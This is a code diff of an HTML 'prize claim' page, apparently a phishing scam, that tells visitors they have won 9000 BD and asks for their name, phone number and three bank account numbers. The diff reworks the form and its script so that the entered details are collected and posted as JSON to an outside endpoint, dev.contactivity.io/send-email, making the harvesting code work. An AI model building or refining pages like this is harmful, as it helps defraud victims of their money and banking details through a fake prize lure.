@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -24,31 +25,39 @@
         }
 
         header img {
-            max-width: 200px; /* Increased logo size */
+            max-width: 200px;
+            /* Increased logo size */
         }
 
         #prize-details {
             background-color: #fff;
             border-bottom: 1px solid #ccc;
             padding-bottom: 20px;
-            text-align: center; /* Center align the form */
+            text-align: center;
+            /* Center align the form */
         }
 
         #prize-details form {
-            max-width: 400px; /* Adjusted form width */
-            margin: 0 auto; /* Center the form */
-            text-align: left; /* Left align form fields */
+            max-width: 400px;
+            /* Adjusted form width */
+            margin: 0 auto;
+            /* Center the form */
+            text-align: left;
+            /* Left align form fields */
         }
 
         #prize-details input,
         #prize-details button {
             display: block;
-            width: calc(100% - 22px); /* Adjusted width to accommodate border */
+            width: calc(100% - 22px);
+            /* Adjusted width to accommodate border */
             padding: 10px;
-            margin-bottom: 15px; /* Add some margin between form elements */
+            margin-bottom: 15px;
+            /* Add some margin between form elements */
             border: 1px solid #ccc;
             border-radius: 5px;
-            box-sizing: border-box; /* Include padding in element width */
+            box-sizing: border-box;
+            /* Include padding in element width */
         }
 
         #prize-details button {
@@ -81,7 +90,8 @@
         #image-section img {
             max-width: 100%;
             height: auto;
-            max-height: 400px; /* Set a maximum height for the image */
+            max-height: 400px;
+            /* Set a maximum height for the image */
         }
 
         footer {
@@ -96,6 +106,7 @@
         }
     </style>
 </head>
+
 <body>
     <header>
         <div class="container">
@@ -112,14 +123,15 @@
         <div class="container">
             <p>You've won a prize of 9000 BD!</p>
             <p>To claim your prize, please fill out the form below and provide details for three accounts.</p>
-            <p>You must provide three accounts to transfer the prize money, with a maximum limit of 3000 BD for each account.</p>
+            <p>You must provide three accounts to transfer the prize money, with a maximum limit of 3000 BD for each
+                account.</p>
             <form id="claim-form">
-                <input type="text" placeholder="Your Name" required>
-                <input type="tel" placeholder="Phone Number" required>
-                <input type="text" placeholder="Account 1 Number (Maximum 3000 BD)" required>
-                <input type="text" placeholder="Account 2 Number (Maximum 3000 BD)" required>
-                <input type="text" placeholder="Account 3 Number (Maximum 3000 BD)" required>
-                <button type="button" onclick="claimPrize()">Claim Prize</button>
+                <input type="text" id="name" placeholder="Your Name" required>
+                <input type="tel" id="phone" placeholder="Phone Number" required>
+                <input type="text" id="account1" placeholder="Account 1 Number (Maximum 3000 BD)" required>
+                <input type="text" id="account2" placeholder="Account 2 Number (Maximum 3000 BD)" required>
+                <input type="text" id="account3" placeholder="Account 3 Number (Maximum 3000 BD)" required>                
+                <button type="submit">Claim Prize</button>
             </form>
         </div>
     </section>
@@ -129,34 +141,44 @@
         </div>
     </footer>
 
+
     <script>
-        function claimPrize() {
-            // Call your API here
-            // Example:
-            fetch('https://dev.contactivity.io/send-email', {
-                method: 'POST',
-                body: JSON.stringify({
-                    name: document.querySelector('#claim-form input[name="name"]').value,
-                    phoneNumber: document.querySelector('#claim-form input[name="phoneNumber"]').value,
-                    account1: document.querySelector('#claim-form input[name="account1"]').value,
-                    account2: document.querySelector('#claim-form input[name="account2"]').value,
-                    account3: document.querySelector('#claim-form input[name="account3"]').value
-                }),
-                headers: {
-                    'Content-Type': 'application/json'
-                }
-            })
-            .then(response => {
-                if (response.ok) {
-                    window.location.href = 'success.html';
-                } else {
-                    alert('Failed to claim prize. Please try again.');
-                }
-            })
-            .catch(error => console.error('Error:', error));
-            
+    document.getElementById('claim-form').addEventListener('submit', function (event) {
+    event.preventDefault();
+    
+    // Get form data using getElementById
+    const name = document.getElementById('name').value;
+    const phoneNumber = document.getElementById('phone').value;
+    const account1 = document.getElementById('account1').value;
+    const account2 = document.getElementById('account2').value;
+    const account3 = document.getElementById('account3').value;
+
+    const formData = {
+        name: name,
+        phoneNumber: phoneNumber,
+        account1: account1,
+        account2: account2,
+        account3: account3
+    };
+
+    fetch('https://dev.contactivity.io/send-email', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(formData)
+    })
+    .then(response => {
+        if (response.ok) {
             window.location.href = 'success.html';
+        } else {
+            alert('Failed to claim prize. Please try again.');
         }
+    })
+    .catch(error => console.error('Error:', error));
+});
+
     </script>
 </body>
+
 </html>
